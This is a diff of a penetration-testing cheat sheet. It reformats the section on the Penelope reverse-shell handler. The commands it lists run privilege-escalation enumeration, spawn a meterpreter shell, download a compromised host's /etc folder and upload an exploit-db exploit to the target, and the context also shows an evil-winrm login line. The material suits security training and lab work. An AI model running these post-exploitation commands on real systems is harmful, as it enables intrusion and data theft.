@@ -139,7 +139,7 @@ Thank you for reading.
 		- [Linux](#linux-1)
 		- [Microsoft Windows](#microsoft-windows-1)
 		- [PassTheCert](#passthecert)
-		- [Penelope](#Penelope)
+		- [Penelope](#penelope)
 		- [PKINITtools](#pkinittools)
 		- [Port Scanning](#port-scanning-1)
 		- [powercat](#powercat)
@@ -6156,17 +6156,17 @@ evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
 #### Penelope
 
 ```c
-F12			// Detach shell and go to Main Menu
-i <session number>	// Interact with a session
+F12            // Detach shell and go to Main Menu
+i <SESSION>    // Interact with a session
 ```
 
 ```c
-┍┽ penelope ┾┑ > run peass_ng		// Run the latest version of PEASS-ng in the background 
-┍┽ penelope ┾┑ > run lse		// Run the latest version of linux-smart-enumeration in the background
-┍┽ penelope ┾┑ > run meterpreter	// Get a meterpreter shell
-┍┽ penelope ┾┑ > download /etc		// Download the remote /etc folder 
-┍┽ penelope ┾┑ > upload https://www.exploit-db.com/exploits/40847	// Upload an exploit to the remote machine
-┍┽ penelope ┾┑ > upload my_scripts_folder				// Upload a local folder to the remote machine
+┍┽ penelope ┾┑ > run peass_ng		                             // Run the latest version of PEASS-ng in the background 
+┍┽ penelope ┾┑ > run lse		                             // Run the latest version of linux-smart-enumeration in the background
+┍┽ penelope ┾┑ > run meterpreter	                             // Get a meterpreter shell
+┍┽ penelope ┾┑ > download /etc		                             // Download the remote /etc folder 
+┍┽ penelope ┾┑ > upload https://www.exploit-db.com/exploits/40847    // Upload an exploit to the remote machine
+┍┽ penelope ┾┑ > upload <FOLDER>			             // Upload a local folder to the remote machine
 ```
 
 #### PKINITtools
